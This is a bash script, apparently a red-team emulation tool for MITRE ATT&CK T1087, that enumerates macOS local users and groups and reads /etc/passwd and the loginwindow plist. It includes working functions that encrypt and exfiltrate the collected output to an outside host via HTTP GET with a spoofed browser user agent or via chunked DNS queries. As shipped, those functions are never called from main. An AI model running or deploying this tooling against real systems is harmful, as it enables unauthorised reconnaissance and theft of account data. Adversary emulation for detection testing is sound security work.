#!/bin/bash
# accounts.sh

# Script Name: accounts.sh
# MITRE ATT&CK Technique: T1087 - Account Discovery
# Tactic: Discovery
# Platform: macOS
# Sub-techniques: 
#   T1087.001 - Local Account
#   T1087.002 - Domain Account (if applicable)
#   T1087.003 - Email Account (if applicable)

# Author: @darmado x.com/darmad0
# Date: 2023-10-06
# Version: 1.5

# Description:
# This script identifies valid local accounts and groups on macOS systems using various techniques.
# It employs native macOS commands to gather user and group information.

# References:
# - https://attack.mitre.org/techniques/T1087/
# - https://attack.mitre.org/techniques/T1087/001/
# - https://attack.mitre.org/techniques/T1087/002/
# - https://attack.mitre.org/techniques/T1087/003/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.yaml

# Global Variables
NAME="accounts_discovery"
TACTIC="d   iscovery"
TTP_ID="T1087"
LOG_FILE="${TTP_ID}_${NAME}.log"
USER=""

#Command Vars
CMD_LIST_USER_DIRS="ls -la /Users"
CMD_LIST_DSCL_USERS="dscl . -list /Users"
CMD_EXTRACT_PASSWD_USERS="cat /etc/passwd"
CMD_SHOW_ID_INFO="id"
CMD_LIST_LOGGED_USERS="who"
CMD_READ_LOGINWINDOW_PLIST="defaults read /Library/Preferences/com.apple.loginwindow.plist"
CMD_LIST_GROUPS_DSCACHEUTIL="dscacheutil -q group"
CMD_LIST_GROUPS_DSCL="dscl . -list /Groups"
CMD_LIST_GROUPS_ETC="grep -v '^#' /etc/group"
CMD_LIST_GROUPS_ID="id -G"
CMD_LIST_GROUPS_CMD="groups"
CMD_LIST_DSCACHEUTIL_USERS="dscacheutil -q user"

# Display help message
display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Description:"
    echo "  Identifies valid local accounts and groups on macOS systems using various native commands."
    echo
    echo "Options:"
    echo "  General:"
    echo "    -h, --help              Display this help message"
    echo "    -v, --verbose           Enable verbose output"
    echo "    -a, --all               Run all techniques"
    echo
    echo "  User Discovery:"
    echo "    -d, --user-dirs         List user directories using 'ls -la /Users'"
    echo "    -l, --dscl-users        List users using 'dscl . -list /Users'"
    echo "    -p, --passwd            Display content of '/etc/passwd'"
    echo "    -i, --id                Show current user info using 'id' command"
    echo "    -w, --who               List logged-in users with 'who' command"
    echo "    -s, --plist             Read user list from loginwindow plist"
    echo "    -m, --dscacheutil       List local users using 'dscacheutil -q user'"
    echo
    echo "  Group Discovery:"
    echo "    -g, --all-groups        Run all group discovery techniques"
    echo "    -gc, --cache-groups     List groups using 'dscacheutil -q group'"
    echo "    -gd, --dscl-groups      List groups using 'dscl . -list /Groups'"
    echo "    -ge, --etc-groups       List groups using 'grep /etc/group'"
    echo "    -gi, --id-groups        List groups using 'id -G'"
    echo "    -gg, --groups-cmd       List groups using 'groups' command"
    echo
    echo "  Output Manipulation:"
    echo "    --encode=TYPE           Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
    echo "    --exfil=URI             Exfiltrate output to URI using HTTP GET"
    echo "    --exfil=dns=DOMAIN      Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)"
    echo "    --encrypt=METHOD        Encrypt output (aes|blowfish|gpg). Generates a random key."
    echo "    --log                 Enable logging of output to a file"
    echo
    echo "Examples:"
    echo "  $0 -a                     Run all discovery techniques"
    echo "  $0 -d -l -p               List user directories, DSCL users, and passwd content"
    echo "  $0 -g                     Run all group discovery techniques"
    echo "  $0 -m --encode=b64        List local users and encode output in base64"
    echo "  $0 -a --exfil=http://example.com --encrypt=aes  Run all techniques, encrypt, and exfiltrate"
    echo
    echo "Note: Some options may require elevated privileges to execute successfully."
}

# Get current user: used for logs only 
# TODO: set USER as global var. This produces unwanted telemetry
get_user() {
    USER=$(whoami)
}

# Function to get the current timestamp
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# Log command invocation 
log() {
    local output="$1"
    local max_size_kb=$((5 * 1024))  # 5MB in kilobytes
    local timestamp
    timestamp=$(get_timestamp)

    # Check file size using du
    if [ -f "$LOG_FILE" ] && [ $(du -k "$LOG_FILE" | cut -f1) -ge $max_size_kb ]; then
        local base_name="${LOG_FILE%.log}"
        local rotate_count=1

        # Rotate logs inside the filename
        while [ -f "${base_name}.${rotate_count}.log" ]; do
            rotate_count=$((rotate_count + 1))
        done

        mv "$LOG_FILE" "${base_name}.${rotate_count}.log"
    fi
}

#key used to encrypt output
generate_random_key() {
    openssl rand -base64 32 | tr -d '\n/'
}

encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

VERBOSE=false
ALL=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""

USER_DIRS=false
DSCL_LIST=false
PASSWD_EXTRACT=false
ID_INFO=false
WHO_LIST=false
PLIST_READ=false
GROUP_ALL=false
GROUP_DSCACHEUTIL=false
GROUP_DSCL=false
GROUP_ETC=false
GROUP_ID=false
GROUP_CMD=false
DSCACHEUTIL_USERS=false

EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
LOG_ENABLED=false

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) 
            display_help
            exit 0 
            ;;
        -v|--verbose)
            VERBOSE=true
            ;;
        -v) VERBOSE=true ;;
        -a) ALL=true ;;
        -d) USER_DIRS=true ;;
        -l) DSCL_LIST=true ;;
        -p) PASSWD_EXTRACT=true ;;
        -i) ID_INFO=true ;;
        -w) WHO_LIST=true ;;
        -s) PLIST_READ=true ;;
        -g) GROUP_ALL=true ;;
        -gc) GROUP_DSCACHEUTIL=true ;;
        -gd) GROUP_DSCL=true ;;
        -ge) GROUP_ETC=true ;;
        -gi) GROUP_ID=true ;;
        -gg) GROUP_CMD=true ;;
        -m) DSCACHEUTIL_USERS=true ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            ENCRYPT_KEY=$(generate_random_key)
            if [ "$VERBOSE" = true ]; then
                echo "Generated encryption key: $ENCRYPT_KEY"
            fi
            ;;
        --log)
            LOG_ENABLED=true
            ;;
        *) echo "Invalid option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# Exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    if [ "$ENCRYPT" != "none" ]; then
        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
    fi
    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Determine if we're using HTTPS
    if [[ "$uri" == https://* ]]; then
        curl_opts="--insecure"
    else
        curl_opts=""
    fi
    
    local full_uri="$uri?d=$encoded_data"
    if [ "$ENCRYPT" != "none" ]; then
        full_uri="${full_uri}&_k=$encoded_key"
    fi
    
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri"
        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
    else
        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
    fi
}

exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63  # Max length of a DNS label

    # Send the ID first
    dig +short "${encoded_id}.id.$domain" A > /dev/null

    # Then send the data in chunks
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    # Send a final chunk to indicate end of transmission
    dig +short "end.$domain" A > /dev/null
}


# Run the get_user function to set the USER global variable
get_user


# Command functions invoked by args
list_user_dirs() {

    echo "[$(get_timestamp)]: user: $USER; msg: Discovered user directories; command: \"$CMD_LIST_USER_DIRS\""
    $CMD_LIST_USER_DIRS
}

list_dscl_users() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed users; command: \"$CMD_LIST_DSCL_USERS\""
    $CMD_LIST_DSCL_USERS
}

extract_passwd_users() {

    echo "[$(get_timestamp)]: user: $USER; msg: Retrieved content of /etc/passwd file; command: \"$CMD_EXTRACT_PASSWD_USERS\""
    $CMD_EXTRACT_PASSWD_USERS
}

show_id_info() {

    echo "[$(get_timestamp)]: user: $USER; msg: Obtained current user info; command: \"$CMD_SHOW_ID_INFO\""
    $CMD_SHOW_ID_INFO
} 

LLU="[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\""
list_logged_users() {

    echo "[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\""
    $CMD_LIST_LOGGED_USERS
}

read_loginwindow_plist() {

    echo "[$(get_timestamp)]: user: $USER; msg: Read content of loginwindow plist; command: \"$CMD_READ_LOGINWINDOW_PLIST\""
    $CMD_READ_LOGINWINDOW_PLIST
}

list_groups_dscacheutil() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCACHEUTIL\""
    $CMD_LIST_GROUPS_DSCACHEUTIL
}

list_groups_dscl() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCL\""
    $CMD_LIST_GROUPS_DSCL
}

list_groups_etc() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups from /etc/group; command: \"$CMD_LIST_GROUPS_ETC\""
    $CMD_LIST_GROUPS_ETC
}

list_groups_id() {
    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_ID\""
    $CMD_LIST_GROUPS_ID
}

list_groups_cmd() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_CMD\""
    $CMD_LIST_GROUPS_CMD
}

list_dscacheutil_users() {

    echo "[$(get_timestamp)]: user: $USER; msg: Listed local users; command: \"$CMD_LIST_DSCACHEUTIL_USERS\""
    $CMD_LIST_DSCACHEUTIL_USERS
}

setup_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_log
    fi
}

# Function to log output
log_and_append() {
    local result="$1"
    
    # Only log if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$result" >> "$LOG_FILE"
    fi
}

# Main function
main() {
    local output=""          # Variable to hold unencoded output
    local encoded_output=""  # Variable to hold encoded output

    # Setup logging if enabled
    if [ "$LOG_ENABLED" = true ]; then
        setup_log
    fi

    # Handle all the invocations and capture output
    if [ "$ALL" = true ] || [ "$USER_DIRS" = true ]; then
        output+="$(list_user_dirs)\n"
    fi

    if [ "$ALL" = true ] || [ "$DSCL_LIST" = true ]; then
        output+="$(list_dscl_users)\n"
    fi

    if [ "$ALL" = true ] || [ "$PASSWD_EXTRACT" = true ]; then
        output+="$(extract_passwd_users)\n"
    fi

    if [ "$ALL" = true ] || [ "$ID_INFO" = true ]; then
        output+="$(show_id_info)\n"
    fi

    if [ "$ALL" = true ] || [ "$WHO_LIST" = true ]; then
        output+="$(list_logged_users)\n"
    fi

    if [ "$ALL" = true ] || [ "$PLIST_READ" = true ]; then
        output+="$(read_loginwindow_plist)\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCACHEUTIL" = true ]; then
        output+="$(list_groups_dscacheutil)\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCL" = true ]; then
        output+="$(list_groups_dscl)\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ETC" = true ]; then
        output+="$(list_groups_etc)\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ID" = true ]; then
        output+="$(list_groups_id)\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_CMD" = true ]; then
        output+="$(list_groups_cmd)\n"
    fi

    if [ "$ALL" = true ] || [ "$DSCACHEUTIL_USERS" = true ]; then
        output+="$(list_dscacheutil_users)\n"
    fi

    # Check if logging is enabled and handle encoding
    if [ "$LOG_ENABLED" = true ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            log_and_append "[$(get_timestamp)]: $encoded_output"  # Log the encoded output
        else
            log_and_append "$output"  # Log the unencoded output
        fi
    else
        # Print to screen if logging is not enabled
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo -e "$encoded_output"
        else
            echo -e "$output"
        fi
    fi
}


main